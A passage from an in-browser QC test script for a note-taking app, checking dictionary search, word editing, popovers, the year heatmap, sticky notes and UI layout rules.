      if (!v || UI.view !== 'dict') { iss('Build J dictionary did not open', key); continue; }
      measure('buildJ/' + key);
      if (v.scrollWidth > v.clientWidth + 1) iss('Build J page scrolls sideways', key);
      if (![...app.querySelectorAll(sel)].some(e => e.offsetWidth)) iss('Build J state not on screen', `${key}: ${sel}`);
      const sc0 = offScale(v); if (sc0.length) iss('Build J controls off the 24/28/32/36 scale', `${key}: ${[...new Set(sc0)].join(', ')}`);
      const c0 = cut(v); if (c0.length) iss('Build J label cut', `${key}: ${c0.join(' / ')}`);
      v.querySelectorAll('svg').forEach(s => { if (s.getBoundingClientRect().width > 20.5) iss('Build J icon over 20px', `${key} ${Math.round(s.getBoundingClientRect().width)}px`); });
      if (th === 'obsidian') { const b = app.querySelector('.dict-body'); J.page[`${sc}/${k}`] = `${app.querySelector('.dict-word')?.textContent || '—'} · ${app.querySelectorAll('.dict-row').length} rows · ${getComputedStyle(b).gridTemplateColumns} · search ${hOf(app.querySelector('#dict-q'))}px`; }
      if (th !== 'obsidian' && k === 'mywords') { const m = app.querySelector('.dict-mine'), bg = getComputedStyle(m.closest('.card')).backgroundColor; const r0 = ratio(getComputedStyle(m).color, bg); J.page[`Yours on ${th}`] = r0; if (r0 < 4.5) iss('Build J "Yours" contrast', `${th} ${r0}`); }
    }
    // QC 2026-10-17: the matches list. No two rows (or a heading and a row) overlap, each row is tall enough for its two
    // lines, and the hover and selected backgrounds (the row's own box) hold everything inside it. Every theme, both
    // fonts, four screens; a long list that scrolls (40 of your words) and a mixed one (Matches, Close spellings, In meanings).
    const listCheck = key => {
      const L = app.querySelector('.dict-list'); if (!L) return; const kids = [...L.children].filter(e => e.offsetHeight), boxes = kids.map(e => e.getBoundingClientRect());
      for (let i = 1; i < kids.length; i++) if (boxes[i].top < boxes[i - 1].bottom - .5) iss('Build J list rows overlap', `${key}: ${kids[i - 1].className.split(' ').pop()} ${Math.round(boxes[i - 1].bottom)} > ${kids[i].className.split(' ').pop()} ${Math.round(boxes[i].top)}`);
      kids.filter(e => e.classList.contains('dict-row')).forEach((r, i) => {
        if (r.scrollHeight > r.clientHeight + 1) iss('Build J row shorter than its text', `${key} row ${i}: ${r.clientHeight} < ${r.scrollHeight}`);
        const rb = r.getBoundingClientRect(); [...r.querySelectorAll('.list-item-title, .list-item-sub, .dict-row-pos, .dict-mine')].forEach(x => { const b = x.getBoundingClientRect(); if (b.height && (b.top < rb.top - .5 || b.bottom > rb.bottom + .5)) iss('Build J text outside its row', `${key} row ${i}`); });
      });
      kids.filter(e => e.classList.contains('dict-group')).forEach((g, i) => { const p = g.previousElementSibling; if (p && g.getBoundingClientRect().top - p.getBoundingClientRect().bottom < 8) iss('Build J heading crowds the row above', `${key} heading ${i}`); });
      const rows = kids.filter(e => e.classList.contains('dict-row')); J.list[key] = `${rows.length} rows · ${[...new Set(rows.map(hOf))].join('/')}px · list ${L.clientHeight}/${L.scrollHeight}px`;
      const frac = h => Math.abs(h - Math.round(h)) > .01;   // Fix A: a zoomed page measures 58.0000038px for a 58px row
      if (rows.some(r => frac(r.getBoundingClientRect().height))) iss('Build J rows not whole pixels', `${key}: ${rows.map(r => r.getBoundingClientRect().height).find(frac)}px`);
    };
    J.list = {};
    for (const sc of Object.keys(SCREENS)) for (const [th] of THEMES) for (const font of ['opendyslexic', 'system']) {
      if (sc !== '1920x1080' && !['obsidian', 'paper', 'contrast'].includes(th)) continue;
      djDemo('ready'); DJL.mine = Array.from({ length: 40 }, (_, i) => ({ key: 'word' + i, word: `Word ${i + 1} with a longer name`, pos: 'noun', definition: 'A meaning long enough to need the ellipsis at the end of its line in the list.', example: '', tags: [], added: '2026-10-01', updated: '2026-10-01' }));
      DJ.mine = DJL.mine.map(w => ({ ...w })); set({ screen: sc, theme: th, font, sample: 'typical', view: 'dict', modal: null }); DJ.scope = 'mine'; DJ.sel = 'word3'; DJ.selEntry = djLocalEntry('word3'); renderAll();
      const row = app.querySelectorAll('.dict-row')[4]; row?.classList.add('is-hover'); listCheck(`${sc}/${th}/${font}/long`);
      const L = app.querySelector('.dict-list'); if (L && L.scrollHeight <= L.clientHeight) iss('Build J long list does not scroll', `${sc}/${th}/${font}`);
      if (L) { L.scrollTop = L.scrollHeight; listCheck(`${sc}/${th}/${font}/long, scrolled`); }
      djDemo('ready'); await openAt({ screen: sc, theme: th, font }, 'ready', 'con'); app.querySelectorAll('.dict-row')[1]?.classList.add('is-hover'); listCheck(`${sc}/${th}/${font}/con`);
    }
    set({ font: 'opendyslexic' }); djDemo('ready');
    // spelling: each misspelling shows its word as a guess; "course" is found in meanings; "xqzt" offers Add
    await openAt({ screen: '1920x1080', theme: 'obsidian' }, 'ready');
    for (const [q, want] of [['consolodate', 'consolidate'], ['affekt', 'affect'], ['recieve', 'receive'], ['seperate', 'separate'], ['definately', 'definitely'], ['milstone', 'milestone'], ['idempotant', 'idempotent'], ['consolidated', 'consolidate'], ['consol', 'consolidate']]) {
      const [got, guess, groups] = await type(q); J.flows['search ' + q] = `${got}${guess ? ' (a guess)' : ''} · ${groups}`;
      if (got !== want || guess !== !['consol'].includes(q)) iss('Build J search', `${q} → ${got}, guess ${guess}`); }
    { const [, , g] = await type('course'); if (!/In meanings/.test(g)) iss('Build J search in meanings', g); }
    { const [got] = await type('xqzt'); if (got || !app.querySelector('.dict-none [data-act="dict-add"]')) iss('Build J no results', got); }
    { await type('pipeline'); const mine = app.querySelector('.dict-sec--mine'), wn = app.querySelectorAll('.dict-pos').length; J.flows.both = `pipeline: your meaning first ${mine === app.querySelector('.dict-entry .dict-sec')} · WordNet sections ${wn}`; if (!mine || !wn) iss('Build J your meaning + WordNet', J.flows.both); }
    // your words: an empty Save gives 2 errors; a saved word is found and marked Yours; a duplicate is caught; Edit keeps the added date; Delete asks first
    { await type(''); djAdd(''); renderAll(); await djSave(); const e0 = [...app.querySelectorAll('.dict-form .field-error')].map(x => x.textContent);
      Object.assign(DJ.form, { word: 'Schema-on-read', def: 'Store raw data first, give it a shape when you read it.', tags: '#course' }); await djSave(); await tick(); renderAll();
      const saved = DJ.mine.find(w => w.key === 'schema-on-read'), [got] = await type('schema'), mark = !!app.querySelector('.dict-row[aria-current="true"] .dict-mine');
      J.flows.add = `empty Save → ${e0.length} errors (${e0.join(' / ')}) · saved ${!!saved}, tags ${saved?.tags} · "schema" → ${got}, Yours ${mark}`;
      if (e0.length !== 2 || !saved || got !== 'Schema-on-read' || !mark) iss('Build J add a word', J.flows.add);
      djAdd('crdt'); DJ.form.def = 'x'; await djSave(); const dup = app.querySelector('.dict-form .field-error')?.textContent || ''; J.flows.duplicate = dup; if (!/already have/.test(dup)) iss('Build J duplicate', dup); DJ.form = null;
      await djEdit('etl'); DJ.form.def = 'Extract, transform, load (edited).'; await djSave(); const etl = DJ.mine.find(w => w.key === 'etl');
      J.flows.edit = `"${etl?.definition}" · added kept ${etl?.added === '2026-09-21'}`; if (!/edited/.test(etl?.definition || '') || etl.added !== '2026-09-21') iss('Build J edit', J.flows.edit);
      fire('dict-del', 'etl'); const ask = app.querySelector('.dict-confirm')?.textContent || '', foc = document.activeElement?.dataset.act; fire('dict-del-no'); const kept = !!DJ.mine.find(w => w.key === 'etl');
      fire('dict-del', 'etl'); fire('dict-del-yes', 'etl'); for (let i = 0; i < 6; i++) await tick();
      J.flows.delete = `asks "${ask.trim().slice(0, 50)}", focus ${foc} · Cancel keeps it ${kept} · Delete removes it ${!DJ.mine.find(w => w.key === 'etl')}`;
      if (!ask || foc !== 'dict-del-no' || !kept || DJ.mine.find(w => w.key === 'etl')) iss('Build J delete', J.flows.delete); }
    // the download: ask (file, source, size) → Download → downloading → Cancel → back to the ask; failed → Try again
    { await openAt({ screen: '1366x768' }, 'none'); const askT = app.querySelector('.dict-get')?.textContent || '';
      fire('dict-download'); for (let i = 0; i < 4; i++) await tick(); const dl = DJ.st.state, bar = !!app.querySelector('.dict-get .progress');
      fire('dict-cancel'); for (let i = 0; i < 4; i++) await tick(); const back = DJ.st.state;
      J.flows.download = `ask "${askT.replace(/\s+/g, ' ').slice(0, 160)}…" · Download → ${dl} (bar ${bar}) · Cancel → ${back}`;
      if (!/11\.4 MB/.test(askT) || !/english-wordnet-2025\.xml\.gz/.test(askT) || !/en-word\.net/.test(askT) || !/CC BY 4\.0/.test(askT) || dl !== 'downloading' || !bar || back !== 'none') iss('Build J download', J.flows.download);
      await openAt({ screen: '1366x768' }, 'none', 'crdt'); if (app.querySelector('.dict-word')?.textContent !== 'CRDT') iss('Build J your words search before the download', app.querySelector('.dict-word')?.textContent);
      await openAt({ screen: '1366x768' }, 'none', '', ); djDemo('none', { offline: true }); renderAll(); if (!app.querySelector('.dict-offline')) iss('Build J offline note', ''); }
    // Read aloud: pressed while reading, and the click keeps the scrolled page where it is (R32)
    for (const sc of ['1920x1080', '1366x768', 'portrait1080']) { const v = await openAt({ screen: sc }, 'ready', 'resolution'); v.scrollTop = 160; const at = v.scrollTop;
      app.querySelector('[data-act="dict-read"]').click(); const pressed = app.querySelector('[data-act="dict-read"]')?.getAttribute('aria-pressed'), after = app.querySelector('#main-view-dict').scrollTop;
      app.querySelector('[data-act="dict-read"]').click(); J.keep['dict/' + sc] = `${at} → ${after}, pressed ${pressed}`; if (Math.abs(after - at) > 1 || pressed !== 'true') iss('Build J Read aloud click', J.keep['dict/' + sc]); }
    { DJ.readMode = 'word'; const e1 = DJ.res?.shown; const t1 = djReadText(e1); DJ.readMode = 'meanings'; const t2 = djReadText(e1); J.flows.readText = `word: "${t1}" · meanings: "${t2.slice(0, 80)}…"`; if (t1 !== 'resolution' || !/^resolution\. Noun: The way a problem is settled/.test(t2)) iss('Build J read-aloud text', J.flows.readText); }
    // the popover on a note's word: a dictionary word, one of yours, a misspelling; inside the window; Open in dictionary
    for (const sc of Object.keys(SCREENS)) for (const word of ['Consolidate', 'CRDT', 'recieve']) {
      djDemo('ready'); set({ screen: sc, theme: 'obsidian', sample: 'typical', view: 'notes', modal: null }); S.noteId = 'note-1'; renderAll();
      const doc = app.querySelector('.doc'), occ = djWordOccurrences(doc, word)[0]; if (!occ) { iss('Build J word not in the note', word); continue; }
      const rr = (() => { const r = document.createRange(); r.setStart(occ.node, occ.start); r.setEnd(occ.node, occ.end); return r.getBoundingClientRect(); })();
      if (rr.right < innerWidth && rr.bottom < innerHeight) {   // a right-click needs the word on screen (the 3440 frame is wider than the pane)
        doc.dispatchEvent(new MouseEvent('contextmenu', { bubbles: true, cancelable: true, clientX: rr.left + 2, clientY: rr.top + rr.height / 2 }));
        const menu = app.querySelector('.menu--word'); if (!menu) { iss('Build J right-click menu', `${sc}/${word}`); continue; } inside('.menu--word', `buildJ/menu/${sc}`);
        menu.querySelector('[data-act="ctx-lookup"]').click(); } else openWord(word, occ.node, occ.start);
      for (let i = 0; i < 4; i++) await tick(); renderAll();
      const pop = app.querySelector('.wordpop'), k = `${sc}/${word}`; if (!pop) { iss('Build J popover', k); continue; }
      inside('.wordpop', 'buildJ/pop/' + k); const s0 = offScale(pop); if (s0.length) iss('Build J popover controls', `${k}: ${s0}`);
      const open = pop.querySelector('[data-act="dict-open"]'), add = pop.querySelector('[data-act="dict-add"], [data-act="dict-edit"]');
      J.pop[k] = `${pop.offsetWidth}×${pop.offsetHeight}px · ${open ? 'Open in dictionary ' + hOf(open) + 'px' : 'no Open'} · ${add?.textContent.trim()} · ${pop.querySelector('.wordpop-mine') ? 'your meaning' : ''}${pop.querySelector('[data-act="word-swap"]') ? ' · swap chips' : ''}`;
      if (!open || !add || (word === 'CRDT') !== !!pop.querySelector('.wordpop-mine') || (word !== 'recieve') !== !!pop.querySelector('[data-act="dict-read-pop"]') || (word === 'recieve' && !pop.querySelector('[data-act="word-swap"][data-v="receive"]'))) iss('Build J popover content', `${k}: ${J.pop[k]}`);
      if (sc === '1920x1080' && word === 'Consolidate') { open.click(); for (let i = 0; i < 4; i++) await tick(); renderAll(); J.pop.open = `→ ${UI.view} "${app.querySelector('.dict-word')?.textContent}" as a tab ${S.tabs.some(t => t.kind === 'view' && t.ref === 'dict')} · popover gone ${!app.querySelector('.wordpop')}`;
        if (UI.view !== 'dict' || app.querySelector('.dict-word')?.textContent !== 'consolidate' || app.querySelector('.wordpop')) iss('Build J Open in dictionary', J.pop.open); }
      S.modal = null; S.word = null; }
    // the rail button and Ctrl+K: "consol" adds a Dictionary group, ">dictionary" lists Open dictionary
    { djDemo('ready'); set({ screen: '1920x1080', view: 'notes', modal: null }); const rb = app.querySelector('.rail [data-v="dict"]'), rbH = rb ? hOf(rb) : 0; rb?.click(); J.flows.rail = `rail button ${!!rb} (${rbH}px) → ${UI.view} as a tab ${S.tabs.some(t => t.ref === 'dict')}`; if (!rb || UI.view !== 'dict' || rbH !== 28) iss('Build J rail button', J.flows.rail);
      set({ view: 'notes' }); openPalette(); S.pal.q = 'consol'; await djPalSearch('consol'); renderAll(); const groups = [...app.querySelectorAll('.pal-group')].map(g => g.textContent), first = S.pal.flat.find(x => x.run?.[0] === 'dict-open');
      runPalette(S.pal.flat.indexOf(first)); for (let i = 0; i < 4; i++) await tick(); renderAll(); J.flows.palette = `"consol" → ${groups.join(' / ')} · ${first?.label} → ${UI.view} "${app.querySelector('.dict-word')?.textContent}"`;
      if (!groups.includes('Dictionary') || UI.view !== 'dict' || app.querySelector('.dict-word')?.textContent !== 'consolidate') iss('Build J Ctrl+K', J.flows.palette);
      set({ view: 'notes' }); openPalette(); S.pal.q = '>dictionary'; renderAll(); if (!S.pal.flat.some(x => x.run?.[0] === 'dict-open')) iss('Build J Ctrl+K command', ''); closeModal(true); }
    // Settings → Voice has the read-aloud setting
    { set({ modal: null }); openSettings('voice'); const row = [...app.querySelectorAll('[data-act="dict-readmode"]')]; J.flows.setting = row.map(b => `${b.textContent} ${b.getAttribute('aria-pressed')} ${hOf(b)}px`).join(' · '); if (row.length !== 2 || row.some(b => hOf(b) > 28.5)) iss('Build J Voice setting', J.flows.setting); closeModal(true); }
    // the year: 365 squares that fill and darken, at every screen and snapped widths; two halves when the card is narrow; the picker, tooltip, keys and History
    const lvlInset = l => { const c = app.querySelector(`.yh-legend .yh-cell[data-lvl="${l}"]`); return c ? getComputedStyle(c, '::before').inset : ''; };
    for (const [sc, w] of [['1920x1080'], ['1366x768'], ['portrait1080'], ['3440x1440'], ['1920x1080', 1000], ['1920x1080', 800]]) for (const th of ['obsidian', 'cream', 'contrast']) {
      set({ screen: sc, theme: th, sample: 'typical', view: 'timer', tpage: 'insights', tstate: 'idle', modal: null }); YH.sel = 'past'; YH.tip = null;
      if (w) { frame.style.width = w + 'px'; renderAll(); }
      const key = `${sc}${w ? '@' + w : ''}/${th}`, card = app.querySelector('.yh-card'); measure('buildJ/year/' + key);
      if (!card) { iss('Build J year card missing', key); continue; }
      const cells = [...card.querySelectorAll('.yh-grid .yh-cell')], sizes = [...new Set(cells.slice(0, 40).map(c => Math.round(c.getBoundingClientRect().width)))], folded = getComputedStyle(card.querySelector('.yh-split')).display !== 'none';
      const v = app.querySelector('#main-view-timer'); if (v.scrollWidth > v.clientWidth + 1) iss('Build J Insights scrolls sideways', key);
      if (cells.length !== 365) iss('Build J year days', `${key}: ${cells.length}`);
      cells.slice(0, 1).forEach(() => { const gr = card.querySelector('.yh-grid'); if (gr.scrollWidth > gr.clientWidth + 1 || px(gr).r > px(card).r) iss('Build J year past the card', key); });
      if (th === 'obsidian') J.year[key] = `card ${Math.round(card.getBoundingClientRect().width)}px · squares ${sizes.join('/')}px · ${folded ? 'two halves' : 'one row of 53 weeks'} · ${card.querySelector('.yh-stats').textContent.replace(/\s+/g, ' ').trim()}`;
      if (sizes.some(s => s < 8)) iss('Build J squares under 8px', `${key}: ${sizes}`);
      const wrapW = card.querySelector('.yh-wrap').clientWidth; if ((wrapW <= 640) !== folded) iss('Build J year fold', `${key}: the year is ${wrapW}px wide, folded ${folded}`);
      const ins = [0, 1, 2, 3, 4].map(lvlInset); if (new Set(ins).size !== 5) iss('Build J squares only change colour', `${key}: ${ins.join(' / ')}`);
      // the inks are color-mix()es: painted on a canvas to read them as rgb
      const cx = (lvlInset.cx ||= document.createElement('canvas').getContext('2d', { willReadFrequently: true })), rgb = c => { cx.clearRect(0, 0, 1, 1); cx.fillStyle = '#000'; cx.fillStyle = c; cx.fillRect(0, 0, 1, 1); const d = cx.getImageData(0, 0, 1, 1).data; return `rgb(${d[0]}, ${d[1]}, ${d[2]})`; };
      const ink = l => rgb(getComputedStyle(card.querySelector(`.yh-legend .yh-cell[data-lvl="${l}"]`), '::before').backgroundColor), base = rgb(getComputedStyle(card).backgroundColor);
      const contr = [1, 2, 3, 4].map(l => ratio(ink(l), base)); if (th !== 'cream' || !w) J.year[`ink ${key}`] = contr.join(' / ');
      if (contr[3] < 3) iss('Build J full square under 3:1', `${key} ${contr}`); if (contr.some((c, i) => i && c <= contr[i - 1])) iss('Build J squares do not darken step by step', `${key} ${contr}`);
    }
    frame.style.width = '';
    { set({ screen: '1920x1080', theme: 'obsidian', view: 'timer', tpage: 'insights' }); YH.sel = 'past'; renderAll(); const card0 = () => app.querySelector('.yh-card'), today = app.querySelector('.yh-card [aria-current="date"]');
      today.dispatchEvent(new MouseEvent('mouseover', { bubbles: true })); const tip1 = app.querySelector('#yh-tip'); const t1 = !tip1.hidden && tip1.textContent;
      const tr = tip1.getBoundingClientRect(), cr = card0().getBoundingClientRect(); if (tr.left < cr.left - 1 || tr.right > cr.right + 1) iss('Build J tooltip past the card', '');
      today.focus();
      today.dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowLeft', bubbles: true })); const wk = YH.focus;
      const prev = app.querySelector('[data-act="hm-prev"]'); prev.click(); const y1 = app.querySelector('.yh-card .card-title').textContent, n1 = app.querySelectorAll('.yh-card .yh-cell.is-future').length;
      app.querySelector('[data-act="hm-prev"]').click(); const y2 = app.querySelector('.yh-card .card-title').textContent;
      J.flows.year = `tooltip "${t1}" · ← goes to ${wk} · ‹ → ${y1} (${n1} to come) · ‹ → ${y2}, then ‹ ${app.querySelector('[data-act="hm-prev"]').disabled ? 'disabled' : 'enabled'}`;
      if (!/of focus|No focus/.test(t1 || '') || wk !== dayKey(yhAdd(tNow(), -7)) || y1 !== 'Focus · 2026' || !n1) iss('Build J year flow', J.flows.year);
      // clicks keep a scrolled Insights page in place; clicking a day opens History at that day
      YH.sel = 'past'; renderAll(); const v = app.querySelector('#main-view-timer'); v.scrollTop = 300; const at = v.scrollTop;
      app.querySelector('[data-act="hm-prev"]').click(); const after = app.querySelector('#main-view-timer').scrollTop; J.keep.year = `${at} → ${after} after ‹`; if (Math.abs(after - at) > 1) iss('Build J year click jumps the page', J.keep.year);
      YH.sel = 'past'; renderAll(); const day = YH.days.filter(x => x.n).slice(-20)[0]; app.querySelector(`.yh-card [data-hd="${day.key}"]`).click(); await new Promise(r => setTimeout(r, 30));
      const tgt = app.querySelector('.hist-day.is-target'), vr = app.querySelector('#main-view-timer').getBoundingClientRect();
      J.flows.history = `day ${day.key} → ${UI.tpage}, marked ${tgt?.dataset.histDay}, ${tgt ? Math.round(tgt.getBoundingClientRect().top - vr.top) : '—'}px from the top`;
      if (UI.tpage !== 'history' || tgt?.dataset.histDay !== day.key || Math.abs(tgt.getBoundingClientRect().top - vr.top) > 2) iss('Build J History at a day', J.flows.history);
      app.querySelector('[data-act="hist-back"]')?.click(); if (UI.tpage !== 'insights' || S.histDay) iss('Build J Back to Insights', UI.tpage);
      set({ sample: 'empty', view: 'timer', tpage: 'insights' }); J.flows.empty = app.querySelector('.yh-empty')?.textContent.trim(); if (!J.flows.empty) iss('Build J empty year', ''); }
    djDemo('ready'); S.modal = null; S.word = null; S.ctx = null; S.histDay = null; YH.sel = 'past'; }
  /* ---- end Build J ---- */
  /* ==== Fix C (QC round 3): stickies, the Brain Dump, the voice pill, names, the ⋮ icon, the 44px rail, Sync details, AI models,
     one weight and the Settings scroll ==== */
  out.numbers.fixC = { rail: {}, flows: {} };
  { const C = out.numbers.fixC, tick = () => new Promise(r => setTimeout(r, 0));
    // a stand-in bridge for a moment (no real microphone, file dialog or database): fake[name] answers, anything else succeeds
    const withApi = async (fake, fn) => { const was = window.pywebview, calls = [];
      window.pywebview = { api: new Proxy({}, { get: (_, n) => typeof n !== 'string' || n === 'then' ? undefined : (...a) => { calls.push(n); return Promise.resolve(fake[n] ? fake[n](...a) : { status: 'success' }); } }) };
      try { await fn(calls); } finally { window.pywebview = was; } return calls; };
    const gone = () => ({ status: 'error', message: 'Sticky note not found.', gone: true });
    const fileNames = key => { const bad = [], walk = document.createTreeWalker(app, NodeFilter.SHOW_TEXT); let n;
      while ((n = walk.nextNode())) { const p = n.parentElement; if (!p || p.closest('.code, textarea, .doc, [contenteditable="true"]') || !p.getClientRects().length) continue; if (/_inbox\.md|stickynoted/.test(n.nodeValue)) bad.push(n.nodeValue.trim().slice(0, 60)); }
      app.querySelectorAll('[data-tip], [title], [aria-label], [placeholder]').forEach(el => ['title', 'aria-label', 'placeholder'].forEach(a => { const v = el.getAttribute(a); if (v && /_inbox\.md|stickynoted/.test(v)) bad.push(`${a} "${v.slice(0, 60)}"`); }));
      if (bad.length) iss('Fix C a file name in a label (20)', `${key}: ${[...new Set(bad)].slice(0, 3).join(' | ')}`); };
    const ON = '[aria-pressed="true"], [aria-selected="true"], [aria-current]:not([aria-current="false"])';
    const oneWeight = key => app.querySelectorAll(ON).forEach(el => { const c = el.classList[0]; if (!c || el.closest('svg')) return;
      const sib = [...el.parentElement.children].find(x => x !== el && x.classList[0] === c && !x.matches(ON)); if (!sib) return;
      const a = getComputedStyle(el).fontWeight, b = getComputedStyle(sib).fontWeight; if (a !== b) iss('Fix C one weight: a chosen item changes weight', `${key}: .${c} ${b} → ${a}`); });
    const moreOk = svg => { const cs = [...svg.children]; return cs.length === 3 && cs.every(c => c.tagName === 'circle' && c.getAttribute('cx') === '12' && c.getAttribute('fill') === 'currentColor' && Math.abs(+c.getAttribute('r') - 1.8) < .01) && cs.map(c => c.getAttribute('cy')).join() === '5,12,19'; };
    const dotsCheck = key => { app.querySelectorAll('svg').forEach(s => { const cs = [...s.children]; if (cs.length === 3 && cs.every(c => c.tagName === 'circle') && !moreOk(s)) iss('Fix C a "more" icon that isn\'t the filled ⋮ (16)', `${key}: ${s.closest('button')?.dataset.act || s.parentElement.className}`); });
      app.querySelectorAll('[data-act="menu"], [data-act="sticky-menu"], [data-act="task-menu"], [data-act="ed-more"]').forEach(b => { const s = b.querySelector('svg'); if (!s || !moreOk(s)) iss('Fix C more-options button without the ⋮ (16)', `${key}: ${b.dataset.act}`); }); };
    if (ICON.dotsv || !ICON.more) iss('Fix C one more icon (16)', `dotsv ${!!ICON.dotsv}`);
    if (TSET_DEFAULTS.stickyOut !== true) iss('Fix C new stickies open popped out by default (5)', String(TSET_DEFAULTS.stickyOut));
    if (typeof AI_CHECK !== 'boolean') iss('Fix C render-ai.js has its own ?check=1 flag', typeof AI_CHECK);

    // 15: the rail is 44px, its 28px buttons 8px from each side, on the window bar's .tb-left buttons; zen keeps the 44px column
    for (const sc of Object.keys(SCREENS)) for (const side of [true, false]) {
      set({ screen: sc, sample: 'typical', view: 'notes', side, zen: 'off', modal: null, widgets: 'none' });
      const rail = app.querySelector('.rail'), rb = rail.querySelector('button'), tb = app.querySelector('.tb-left button'), r = px(rail), b = px(rb), t = px(tb);
      const nums = { w: half(r.w), left: half(b.l - r.l), right: half(r.r - b.r), bar: half(t.l - b.l) }; C.rail[`${sc}/${side ? 'side' : 'noside'}`] = nums;
      if (Math.abs(r.w - 44) > .5 || Math.abs(nums.left - 8) > .5 || Math.abs(nums.right - 8) > .5 || Math.abs(t.l - b.l) > .5) iss('Fix C rail 44px, buttons 8px each side, on the window bar (15)', `${sc}/${side}: ${JSON.stringify(nums)}`);
      const last = [...rail.querySelectorAll('button')].pop(), up = half(r.b - px(last).b); if (Math.abs(up - nums.left) > .5) iss('Fix C / QC 73 the rail\'s last button sits as far off the bottom as off its sides', `${sc}/${side}: ${up} vs ${nums.left}`);
      if (side) { set({ zen: 'on' }); const zl = app.querySelector('.titlebar .tb-left'), zb = zl?.querySelector('button'); const zc = zb ? half(px(zb).l + px(zb).w / 2) : null; C.rail[`${sc}/zen`] = { col: zl ? half(px(zl).w) : null, centre: zc };
        if (!zb || Math.abs(px(zl).w - 44) > .5 || Math.abs(zc - 22) > .5) iss('Fix C zen window bar off the 44px column (15)', `${sc}: ${JSON.stringify(C.rail[`${sc}/zen`])}`); set({ zen: 'off' }); }
    }

    // 18: a sticky NeuroVault hears is gone never shows in the app; "not found" on close is closed; the strip's × closes its window
    set({ screen: '1920x1080', sample: 'typical', view: 'notes', side: true, modal: null, widgets: 'none' });
    { const [a, b] = D.stickies; a.open = true; a.out = true; b.open = true; b.out = false; b.text = ''; POPS.items = [{ kind: 'sticky', id: rawId(a.id), key: 'sticky:' + rawId(a.id) }]; renderAll();
      window.nvSync({ kind: 'popped', items: [], back: null, closed: null, gone: 'sticky:' + rawId(a.id) });
      C.flows.gone = `forgotten ${!D.stickies.includes(a)} · card ${!!app.querySelector(`[data-widget="st:${a.id}"]`)}`;
      if (D.stickies.includes(a) || app.querySelector(`[data-widget="st:${a.id}"]`)) iss('Fix C a deleted popped-out sticky comes back in the app (18)', C.flows.gone);
      CAPTURE.live = true; S.toast = null;
      const c1 = await withApi({ delete_sticky: gone }, () => closeSticky(b.id));
      C.flows.closeGone = `${c1.join(',')} → card ${!!app.querySelector(`[data-widget="st:${b.id}"]`)} · toast "${S.toast || ''}"`;
      if (D.stickies.includes(b) || app.querySelector(`[data-widget="st:${b.id}"]`) || /not found/i.test(S.toast || '')) iss('Fix C × on a sticky that is already gone (18)', C.flows.closeGone);
      loadSample('typical'); const [p, q] = D.stickies; p.text = ''; p.open = true; p.out = true; q.open = false; q.out = false;
      const c2 = await withApi({ delete_sticky: gone }, () => popDo('pop-close', 'st:' + p.id));
      const c3 = await withApi({}, async () => { await popDo('pop-close', 'st:' + p.id); await new Promise(r => setTimeout(r, 1600)); });
      { const nolog = c => c.filter(x => x !== 'log_client'); c2.splice(0, c2.length, ...nolog(c2)); c3.splice(0, c3.length, ...nolog(c3)); }   // QC 95's page-error lines aren't the window's calls
      C.flows.stripClose = `gone: ${c2.join(',')} · deleted: ${c3.join(',')}`;
      if (c2.join() !== 'delete_sticky,pop_close' || c3.join() !== 'delete_sticky,pop_close') iss('Fix C the strip\'s × closes its window (18)', C.flows.stripClose);
      // the sidebar's Sticky Notes row: popped-out ones come to the front, closed ones open; one whose window has gone opens in the app
      loadSample('typical'); const [o, cl] = D.stickies; o.open = true; o.out = true; cl.open = false; cl.out = false;
      const c4 = await withApi({}, async () => { showSticky(); await tick(); });
      const c5 = await withApi({ pop_show: () => ({ status: 'error', message: "It isn't popped out." }) }, async () => { o.out = true; showSticky(o.id); await tick(); await tick(); });
      C.flows.show = `${c4.join(',')} · closed one open ${cl.open} · stale window: ${c5.join(',')} → in the app ${o.open && !o.out}`;
      if (!c4.includes('pop_show') || !cl.open || !o.open || o.out) iss('Fix C Sticky Notes row reopens closed and popped-out stickies (18)', C.flows.show);
      CAPTURE.live = false; POPS.items = []; loadSample('typical'); S.toast = null; }

    // 6 + 16: the sticky's icons and its popped-out strip's are 18px at 1.75px, Lucide; ⋮ everywhere
    set({ screen: '1920x1080', sample: 'typical', view: 'notes', side: true, modal: null }); D.stickies[0].open = true; D.stickies[0].out = false; renderAll();
    { const card = app.querySelector('.sticky'), head = card.querySelector('.widget-head'), strip = document.createElement('div');
      strip.className = 'widget-head'; strip.innerHTML = popBtns('st:' + D.stickies[0].id) + popCloseBtn('st:' + D.stickies[0].id, 'sticky note 1'); card.appendChild(strip);
      const sizes = [...head.querySelectorAll('svg'), ...strip.querySelectorAll('svg')].map(s => `${Math.round(s.getBoundingClientRect().width)}/${getComputedStyle(s).strokeWidth}`);
      C.flows.stickyIcons = sizes.join(' '); strip.remove();
      if (sizes.some(x => x !== '18/1.75px')) iss('Fix C sticky icons off the app\'s 18px / 1.75px (6)', C.flows.stickyIcons);
      if ([...card.querySelectorAll('.widget-grip circle')].map(c => c.getAttribute('cy')).join() !== '12,5,19,12,5,19') iss('Fix C sticky grip isn\'t Lucide grip-vertical (6)', ''); }
    dotsCheck('notes'); oneWeight('notes'); fileNames('notes');
    set({ view: 'tasks' }); dotsCheck('tasks'); oneWeight('tasks'); set({ view: 'timer' }); oneWeight('timer'); set({ view: 'notes' });

    // 20: Brain Dump and Sticky Notes, never the file names: the sidebar, tooltips, Ctrl+K, toasts, Settings, the Attachments tab, the wrap-up
    { const rows = [...app.querySelectorAll('.tree-sys .tree-name')].map(e => e.textContent); C.flows.names = rows.join(' / ');
      if (rows.join() !== 'Brain Dump,Sticky Notes') iss('Fix C sidebar rows read as names (20)', C.flows.names);
      for (const q of ['', 'brain', 'sticky', 'dump']) { openPalette(); S.pal.q = q; renderAll(); fileNames(`palette "${q}"`); closeModal(); }
      const s = D.stickies[0]; s.text = 'Call Sam'; await closeSticky(s.id); renderAll(); C.flows.toast = S.toast; fileNames('close toast'); if (!/Sticky Notes/.test(S.toast || '')) iss('Fix C close toast names Sticky Notes (20)', S.toast);
      set({ modal: 'settings' }); for (const sec of [...app.querySelectorAll('.settings-nav [data-v]')].map(b => b.dataset.v)) { S.setSec = sec; set({ modal: 'settings' }); fileNames(`settings/${sec}`); oneWeight(`settings/${sec}`); }
      set({ modal: null, inspector: 'shown' }); S.tab = 'files'; renderAll(); [...app.querySelectorAll('[data-act="att-open"]')].forEach(b => { S.attOpen = b.dataset.v; renderAll(); fileNames('attachments ' + b.dataset.v); }); S.attOpen = null; S.tab = 'outline';
